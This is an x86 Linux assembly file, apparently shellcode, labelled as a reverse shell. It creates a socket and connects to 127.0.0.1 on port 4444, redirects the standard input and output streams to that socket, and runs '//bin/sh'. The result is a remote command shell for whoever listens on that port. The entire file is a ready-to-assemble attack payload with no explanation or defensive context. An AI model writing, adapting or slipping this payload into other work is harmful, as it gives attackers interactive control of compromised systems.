;reverse_shell
;author:Swaroop Yermalkar

global _start
section .text
_start:

;sockfd = socket(AF_INET, SOCK_STREAM, 0);

xor ebx,ebx
xor eax,eax

mov byte al,0x66
push ebx
inc ebx 
push ebx 
push byte 0x2 
mov ecx, esp 
int 0x80 

xchg ebx,eax

push byte 0x2
pop ecx

dup_loop:
  mov BYTE al, 0x3F 
  int 0x80          
  dec ecx           
  jns dup_loop      


push 0x0101017f  
push word 0x5c11
push word 2
mov ecx,esp     
push byte 0x10  
push ecx                 
push ebx                 
mov ecx,esp
mov al,102               
int 0x80


;execve

xor eax,eax
push eax

push 0x68732f6e
push 0x69622f2f

mov ebx,esp

push eax
mov ecx,esp

push ebx
mov edx,esp

mov al,11
int 0x80